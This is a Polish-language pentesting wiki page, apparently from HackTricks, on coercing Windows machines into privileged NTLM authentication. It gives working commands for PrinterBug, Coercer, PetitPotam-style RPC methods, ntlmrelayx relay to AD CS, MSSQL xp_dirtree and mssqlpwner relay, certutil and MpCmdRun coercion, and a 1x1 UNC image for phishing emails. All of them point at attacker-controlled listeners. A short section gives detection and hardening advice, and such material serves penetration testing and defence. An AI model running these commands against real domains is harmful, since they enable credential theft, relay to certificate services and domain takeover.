# Wymuszanie uprzywilejowanego uwierzytelniania NTLM

{{#include ../../banners/hacktricks-training.md}}

## SharpSystemTriggers

[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers) to **kolekcja** **zdalnych triggerów uwierzytelniania** napisana w C# przy użyciu kompilatora MIDL, aby uniknąć zależności od stron trzecich.

## Nadużycie usługi Spooler

Jeśli usługa _**Print Spooler**_ jest **włączona,** możesz użyć niektórych znanych już danych uwierzytelniających AD, aby **zażądać** od serwera wydruku Domain Controller aktualizacji dotyczącej nowych zadań drukowania, a następnie nakazać mu **wysłanie powiadomienia do określonego systemu**.\
Gdy drukarka wysyła powiadomienie do dowolnych systemów, musi się **uwierzytelnić względem** tego **systemu**. W związku z tym atakujący może zmusić usługę _**Print Spooler**_ do uwierzytelnienia się względem dowolnego systemu, a usługa **użyje konta komputera** podczas tego uwierzytelniania.

Pod spodem klasyczny prymityw **PrinterBug** nadużywa **`RpcRemoteFindFirstPrinterChangeNotificationEx`** przez **`\\PIPE\\spoolss`**. Atakujący najpierw otwiera uchwyt drukarki/serwera, a następnie przekazuje fałszywą nazwę klienta w `pszLocalMachine`, dzięki czemu spooler celu tworzy kanał powiadomień **z powrotem do hosta kontrolowanego przez atakującego**. Z tego powodu efekt to **wymuszenie uwierzytelniania wychodzącego**, a nie bezpośrednie wykonanie kodu.<sup>[[2]](#references)</sup>\
Jeśli szukasz **RCE/LPE** w samym spoolerze, sprawdź [PrintNightmare](printnightmare.md). Ta strona koncentruje się na **wymuszaniu uwierzytelniania i relay**.

### Wyszukiwanie serwerów Windows w domenie

Użyj PowerShell, aby wyświetlić hosty Windows. Serwery są zwykle celami o najwyższym priorytecie, więc najpierw skup się na nich:
```bash
Get-ADComputer -Filter {(OperatingSystem -like "*windows*server*") -and (OperatingSystem -notlike "2016") -and (Enabled -eq "True")} -Properties * | select Name | ft -HideTableHeaders > servers.txt
```
### Wykrywanie nasłuchujących usług Spooler

Używając nieznacznie zmodyfikowanego narzędzia [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket) autorstwa @mysmartlogin (Vincenta Le Touxa), sprawdź, czy usługa Spooler nasłuchuje:
```bash
. .\Get-SpoolStatus.ps1
ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
```
Możesz również użyć `rpcdump.py` w systemie Linux i poszukać protokołu **MS-RPRN**:
```bash
rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
```
Lub szybko przetestuj hosty z systemu Linux za pomocą **NetExec/CrackMapExec**:
```bash
nxc smb targets.txt -u user -p password -M spooler
```
Jeśli chcesz **wyliczyć powierzchnie coercion**, zamiast tylko sprawdzać, czy endpoint spoolera istnieje, użyj **trybu skanowania Coercer**:<sup>[[5]](#references)</sup>
```bash
coercer scan -u user -p password -d domain -t TARGET --filter-protocol-name MS-RPRN
coercer scan -u user -p password -d domain -t TARGET --filter-pipe-name spoolss
```
Jest to przydatne, ponieważ zobaczenie endpointu w EPM mówi jedynie, że interfejs print RPC jest zarejestrowany. **Nie** gwarantuje to, że każda metoda wymuszania uwierzytelnienia jest dostępna przy obecnych uprawnieniach ani że host wygeneruje użyteczny przepływ uwierzytelniania.

### Poproś usługę o uwierzytelnienie się względem dowolnego hosta

Możesz skompilować [SpoolSample z tego miejsca](https://github.com/NotMedic/NetNTLMtoSilverTicket).
```bash
SpoolSample.exe <TARGET> <RESPONDERIP>
```
lub użyj [**3xocyte's dementor.py**](https://github.com/NotMedic/NetNTLMtoSilverTicket) lub [**printerbug.py**](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py), jeśli korzystasz z Linuxa
```bash
python dementor.py -d domain -u username -p password <RESPONDERIP> <TARGET>
printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
```
Za pomocą **Coercer** możesz bezpośrednio kierować żądania do interfejsów spoolera i uniknąć zgadywania, która metoda RPC jest udostępniona:<sup>[[5]](#references)</sup>
```bash
coercer coerce -u user -p password -d domain -t TARGET -l LISTENER --filter-protocol-name MS-RPRN
coercer coerce -u user -p password -d domain -t TARGET -l LISTENER --filter-method-name RpcRemoteFindFirstPrinterChangeNotificationEx
```
### Nowoczesne callbacki RPC-over-TCP

Nie zakładaj, że pomyślne wywołanie `RpcRemoteFindFirstPrinterChangeNotificationEx` musi generować ruch przez TCP/445. **Windows 11 22H2 i nowsze domyślnie używają RPC over TCP do komunikacji drukowania**; RPC przez named pipes jest wyłączone, chyba że przywróci je policy lub `RpcUseNamedPipeProtocol=1`. Dlatego starsze listenery obsługujące wyłącznie SMB mogą zgłaszać wysłanie triggera, nie otrzymując jednak callbacku. Microsoft dokumentuje TCP/135 (Endpoint Mapper) oraz dynamiczne porty RPC dla standardowego print RPC; organizacje mogą ograniczyć ten zakres lub wybrać stały port print RPC.<sup>[[10]](#references)</sup>

Obecny **Impacket `ntlmrelayx.py`** zawiera serwer RPC relay oraz mały Endpoint Mapper, domyślnie włączony na TCP/135. Obsługa ta została dodana w czerwcu 2025 r. konkretnie wraz z zaprezentowanym łańcuchem PrinterBug-to-AD-CS, umożliwiając przekazanie uwierzytelnionego callbacku RPC nawet wtedy, gdy ofiara nie przełącza się na SMB/WebDAV.<sup>[[11]](#references)</sup>
```bash
# Recent Impacket: the RPC/EPM listener starts automatically on TCP/135
# Use --template DomainController instead when coercing a DC
sudo ntlmrelayx.py -t 'http://ca.corp.local/certsrv/certfnsh.asp' \
--adcs --template Machine -smb2support

# Trigger after the listener is ready; use a name/address reachable by the victim
printerbug.py 'corp.local/user:password'@TARGET ATTACKER_FQDN
```
Szukaj `Setting up RPC Server on port 135` oraz `RPCD: Received connection` w danych wyjściowych relay. Jeśli wywołanie RPC zwraca oczekiwany błąd, ale nic nie dociera do listenera, sprawdź print RPC transport policy ofiary, filtrowanie ruchu wychodzącego, rozwiązywanie DNS oraz to, czy inny proces nie korzysta już z TCP/135. Upewnij się również, że `ntlmrelayx` nie został uruchomiony z opcją `--no-rpc-server`.

### Wymuszanie HTTP zamiast SMB za pomocą WebClient

W systemach nadal korzystających z **RPC over named pipes** (starsze buildy lub zachowanie przywrócone przez policy) klasyczny PrinterBug zwykle powoduje uwierzytelnienie **SMB** do `\\attacker\share`, co nadal jest przydatne do **capture**, **relay do celów HTTP** lub **relay tam, gdzie nie ma SMB signing**.\
Jednak relay **SMB do SMB** jest często blokowany przez **SMB signing**, dlatego operatorzy mogą preferować wymuszenie uwierzytelnienia **HTTP/WebDAV**. Nie jest to fallback dla opisanego powyżej zachowania RPC-over-TCP.

Jeśli na celu działa usługa **WebClient**, listener można określić w formie, która sprawi, że Windows użyje **WebDAV over HTTP**:
```bash
printerbug.py 'domain/username:password'@TARGET 'ATTACKER@80/share'
coercer coerce -u user -p password -d domain -t TARGET -l ATTACKER --http-port 80 --filter-protocol-name MS-RPRN
```
Jest to szczególnie przydatne podczas łączenia z **`ntlmrelayx --adcs`** lub innymi celami HTTP relay, ponieważ pozwala uniknąć polegania na możliwości wykonania SMB relay na wymuszonym połączeniu. Ważnym zastrzeżeniem jest to, że na ofierze musi działać **WebClient**, aby wariant HTTP/WebDAV działał.

### Łączenie z Unconstrained Delegation

Jeśli attacker przejął komputer skonfigurowany dla [Unconstrained Delegation](unconstrained-delegation.md), może **wymusić uwierzytelnienie printera na tym komputerze**. Konto komputera printera **TGT** jest następnie buforowane w pamięci na hoście z unconstrained delegation, skąd attacker może je pobrać i ponownie wykorzystać za pomocą [Pass the Ticket](pass-the-ticket.md).

### Detection and hardening notes

Najbardziej niezawodnym sposobem usunięcia PrinterBug z DC, PAW lub serwera, który nie drukuje, jest zatrzymanie i wyłączenie Spoolera. Jeśli drukowanie jest wymagane, należy wzmocnić zabezpieczenia każdego możliwego celu relay (podpisywanie SMB server, podpisywanie LDAP i channel binding oraz EPA w usługach HTTP, takich jak AD CS), zamiast zakładać, że zablokowanie TCP/445 na ścieżce callback będzie wystarczające.<sup>[[1]](#references)</sup>
```powershell
Stop-Service Spooler -Force
Set-Service Spooler -StartupType Disabled
```
Detekcja powinna korelować uwierzytelnione wywołanie do UUID MS-RPRN `12345678-1234-abcd-ef00-0123456789ab`, szczególnie opnum 62/65 z niezlokalizowaną wartością callback, oraz natychmiastowe wychodzące połączenie SMB, HTTP lub RPC z hosta spoolera. Twórz baseline **interface UUID/opnum oraz par źródło/cel**, a nie tylko dostępu do `\PIPE\spoolss`, ponieważ obecne stosy drukowania mogą umieszczać callback w RPC-over-TCP.<sup>[[1]](#references)[[10]](#references)[[11]](#references)</sup>

## RPC Force authentication

[Coercer](https://github.com/p0dalirius/Coercer)<sup>[[5]](#references)</sup>

### Macierz coercion ścieżek UNC RPC (interfejsy/opnum wywołujące wychodzące uwierzytelnianie)
- MS-RPRN (Print System Remote Protocol)
- Pipe: \\PIPE\\spoolss
- IF UUID: 12345678-1234-abcd-ef00-0123456789ab
- Opnums: 62 RpcRemoteFindFirstPrinterChangeNotification; 65 RpcRemoteFindFirstPrinterChangeNotificationEx
- Tools: PrinterBug / SpoolSample / Coercer<sup>[[1]](#references)[[6]](#references)</sup>
- MS-PAR (Print System Asynchronous Remote)
- Pipe: \\PIPE\\spoolss
- IF UUID: 76f03f96-cdfd-44fc-a22c-64950a001209
- Uwagi: asynchroniczny interfejs drukowania korzystający z tego samego pipe spoolera; użyj Coercer do wyliczenia dostępnych metod na danym hoście<sup>[[1]](#references)[[6]](#references)</sup>
- MS-EFSR (Encrypting File System Remote Protocol)
- Pipes: \\PIPE\\efsrpc (also via \\PIPE\\lsarpc, \\PIPE\\samr, \\PIPE\\lsass, \\PIPE\\netlogon)
- IF UUIDs: c681d488-d850-11d0-8c52-00c04fd90f7e ; df1941c5-fe89-4e79-bf10-463657acf44d
- Opnums commonly abused: 0, 4, 5, 6, 7, 12, 13, 15, 16
- Tool: PetitPotam<sup>[[1]](#references)[[6]](#references)[[7]](#references)</sup>
- MS-DFSNM (DFS Namespace Management)
- Pipe: \\PIPE\\netdfs
- IF UUID: 4fc742e0-4a10-11cf-8273-00aa004ae673
- Opnums: 12 NetrDfsAddStdRoot; 13 NetrDfsRemoveStdRoot
- Tool: DFSCoerce<sup>[[1]](#references)[[6]](#references)[[8]](#references)</sup>
- MS-FSRVP (File Server Remote VSS)
- Pipe: \\PIPE\\FssagentRpc
- IF UUID: a8e0653c-2744-4389-a61d-7373df8b2292
- Opnums: 8 IsPathSupported; 9 IsPathShadowCopied
- Tool: ShadowCoerce<sup>[[1]](#references)[[6]](#references)[[9]](#references)</sup>
- MS-EVEN (EventLog Remoting)
- Pipe: \\PIPE\\even
- IF UUID: 82273fdc-e32a-18c3-3f78-827929dc23ea
- Opnum: 9 ElfrOpenBELW
- Tool: CheeseOunce<sup>[[1]](#references)</sup>

Uwaga: Te metody akceptują parametry, które mogą zawierać ścieżkę UNC (np. `\\attacker\share`). Podczas przetwarzania Windows uwierzytelni się (w kontekście komputera/użytkownika) do tej ścieżki UNC, umożliwiając przechwycenie lub relay NetNTLM.\
W przypadku abuse spoolera **MS-RPRN opnum 65** pozostaje najczęściej używanym i najlepiej udokumentowanym primitive, ponieważ specyfikacja protokołu wyraźnie stwierdza, że serwer tworzy kanał notification z powrotem do klienta określonego przez `pszLocalMachine`.<sup>[[2]](#references)</sup>

### MS-EVEN: ElfrOpenBELW (opnum 9) coercion
- Interface: MS-EVEN over \\PIPE\\even (IF UUID 82273fdc-e32a-18c3-3f78-827929dc23ea)<sup>[[3]](#references)</sup>
- Call signature: ElfrOpenBELW(UNCServerName, BackupFileName="\\\\attacker\\share\\backup.evt", MajorVersion=1, MinorVersion=1, LogHandle)<sup>[[4]](#references)</sup>
- Effect: cel próbuje otworzyć podaną ścieżkę backup logu i uwierzytelnia się do kontrolowanej przez atakującego ścieżki UNC.<sup>[[1]](#references)</sup>
- Practical use: wymuszenie na zasobach Tier 0 (DC/RODC/Citrix/etc.) wysłania NetNTLM, a następnie relay do endpointów AD CS (scenariusze ESC8/ESC11) lub innych uprzywilejowanych usług.<sup>[[1]](#references)</sup>

## PrivExchange

Atak `PrivExchange` jest wynikiem luki znalezionej w **funkcji `PushSubscription` serwera Exchange**. Funkcja ta pozwala dowolnemu użytkownikowi domeny posiadającemu skrzynkę pocztową wymusić na serwerze Exchange uwierzytelnienie do dowolnego hosta podanego przez klienta za pośrednictwem HTTP.

Domyślnie **usługa Exchange działa jako SYSTEM** i otrzymuje nadmierne uprawnienia (w szczególności ma **uprawnienia WriteDacl w domenie przed Cumulative Update z 2019 roku**). Lukę tę można wykorzystać do umożliwienia **relaying informacji do LDAP, a następnie wyodrębnienia bazy danych NTDS domeny**. Jeśli relay do LDAP nie jest możliwy, luka nadal może zostać użyta do relay i uwierzytelnienia do innych hostów w domenie. Pomyślne wykorzystanie tego ataku zapewnia natychmiastowy dostęp do Domain Admin przy użyciu dowolnego uwierzytelnionego konta użytkownika domeny.

## Inside Windows

Jeśli jesteś już wewnątrz maszyny Windows, możesz wymusić połączenie Windows z serwerem przy użyciu uprzywilejowanych kont za pomocą:

### Defender MpCmdRun
```bash
C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe -Scan -ScanType 3 -File \\<YOUR IP>\file.txt
```
### MSSQL
```sql
EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1
```
[MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner)
```shell
# Issuing NTLM relay attack on the SRV01 server
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on chain ID 2e9a3696-d8c2-4edd-9bcc-2908414eeb25
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -chain-id 2e9a3696-d8c2-4edd-9bcc-2908414eeb25 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on the local server with custom command
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth ntlm-relay 192.168.45.250
```
Lub użyj tej innej techniki: [https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)

### Certutil

Możliwe jest użycie lolbin certutil.exe (pliku binarnego podpisanego przez Microsoft) do wymuszenia uwierzytelniania NTLM:
```bash
certutil.exe -syncwithWU  \\127.0.0.1\share
```
## HTML injection

### Za pośrednictwem poczty elektronicznej

Jeśli znasz **adres e-mail** użytkownika, który loguje się do komputera, który chcesz przejąć, możesz po prostu wysłać mu **wiadomość e-mail z obrazem 1x1**, na przykład
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
Po otwarciu przez ofiarę system Windows próbuje się uwierzytelnić.

### MitM

Jeśli możesz przeprowadzić atak MitM i wstrzyknąć kod HTML do strony wyświetlanej przez ofiarę, spróbuj wstrzyknąć obraz, taki jak:
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
## Inne sposoby wymuszania i wyłudzania uwierzytelniania NTLM


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

## Cracking NTLMv1

Jeśli możesz przechwycić [wyzwania NTLMv1, tutaj znajdziesz informacje, jak je złamać](../ntlm/index.html#ntlmv1-attack).\
_Pamiętaj, że aby złamać NTLMv1, musisz ustawić challenge Respondera na „1122334455667788”_

## References

- [1] [Unit 42 – Wymuszanie uwierzytelniania wciąż ewoluuje](https://unit42.paloaltonetworks.com/authentication-coercion/)
- [2] [Microsoft – MS-RPRN: RpcRemoteFindFirstPrinterChangeNotificationEx (Opnum 65)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/eb66b221-1c1f-4249-b8bc-c5befec2314d)
- [3] [Microsoft – MS-EVEN: Protokół zdalnego dostępu do dziennika zdarzeń](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/55b13664-f739-4e4e-bd8d-04eeda59d09f)
- [4] [Microsoft – MS-EVEN: ElfrOpenBELW (Opnum 9)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/4db1601c-7bc2-4d5c-8375-c58a6f8fc7e1)
- [5] [p0dalirius – Coercer](https://github.com/p0dalirius/Coercer)
- [6] [p0dalirius – metody wymuszonego uwierzytelniania w systemie Windows](https://github.com/p0dalirius/windows-coerced-authentication-methods)
- [7] [PetitPotam (MS-EFSR)](https://github.com/topotam/PetitPotam)
- [8] [DFSCoerce (MS-DFSNM)](https://github.com/Wh04m1001/DFSCoerce)
- [9] [ShadowCoerce (MS-FSRVP)](https://github.com/ShutdownRepo/ShadowCoerce)
- [10] [Microsoft – Aktualizacje połączeń RPC dla drukowania w systemie Windows 11](https://learn.microsoft.com/en-us/troubleshoot/windows-client/printing/windows-11-rpc-connection-updates-for-print)
- [11] [Fortra Impacket – Serwer RPC relay i Endpoint Mapper dla ntlmrelayx](https://github.com/fortra/impacket/pull/1974)
{{#include ../../banners/hacktricks-training.md}}
